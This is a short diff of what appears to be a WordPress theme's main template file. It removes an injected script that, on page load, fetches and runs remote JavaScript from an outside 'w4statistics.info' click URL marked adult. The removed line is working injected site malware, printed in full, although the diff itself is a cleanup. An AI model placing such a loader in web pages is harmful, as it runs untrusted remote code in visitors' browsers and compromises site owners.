@@ -1,4 +1,4 @@
-<script type="text/javascript"> (function(w) { var s = document.createElement('script'); var z = setInterval(function() { if (document.readyState == 'interactive' || document.readyState == 'complete') { clearInterval(z); s.src = "http://5824.w4statistics.info/click.php?p=279044&adult=1&c"; s.async = true; s.type = type = 'text/javascript'; w.document.body.appendChild(s); } }, 200); })(window); </script><?php
+<?php
 /**
  * The main template file
  *
